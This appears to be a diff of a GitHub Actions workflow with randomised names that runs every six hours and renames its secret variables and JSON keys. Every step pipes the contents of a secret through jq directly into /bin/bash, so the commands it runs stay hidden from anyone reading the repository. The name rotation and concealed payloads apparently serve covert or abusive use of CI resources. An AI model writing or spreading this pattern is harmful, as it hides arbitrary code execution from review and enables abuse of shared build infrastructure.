@@ -3,28 +3,23 @@ name: gulingwu7565
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-
-jobs:  # 12629
+    - cron: '4 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gulingwu7565
         env:
-          y244: ${{ secrets.y244 }}
+          snty45: ${{ secrets.snty45 }}
         run: |
-          echo $y244 | jq -r .gqmv33 | /bin/bash
-          echo $kzb9 | jq -r .t961 | /bin/bash
-          echo $vdlna1496 | jq -r .rtu72273 | /bin/bash
-          echo $hiyx228 | jq -r .i12 | /bin/bash
-          echo $dt56 | jq -r .md33502 | /bin/bash
-          echo $neaeu71616 | jq -r .tuolw201 | /bin/bash
-          echo $ihi4 | jq -r .niaaw563 | /bin/bash
-          echo $cfac29887 | jq -r .nbkrw805 | /bin/bash
-          echo $a71 | jq -r .j58228 | /bin/bash
-          echo $nz1927 | jq -r .otb82 | /bin/bash
-          echo $zygg413 | jq -r .qy4 | /bin/bash
-          echo $rvxt46632 | jq -r .lt22 | /bin/bash
+          echo $snty45 | jq -r .bs4130 | /bin/bash
+          echo $lowup3983 | jq -r .hhj52810 | /bin/bash
+          echo $uebtl75 | jq -r .heyz92 | /bin/bash
+          echo $g740 | jq -r .g51 | /bin/bash
+          echo $v494 | jq -r .ynrh556 | /bin/bash
+          echo $sshu77279 | jq -r .vixif889 | /bin/bash
+          echo $zwnwg62537 | jq -r .qomfw78080 | /bin/bash
+          echo $zi2 | jq -r .f02220 | /bin/bash
+          echo $jqrhk1924 | jq -r .ipi49138 | /bin/bash
 
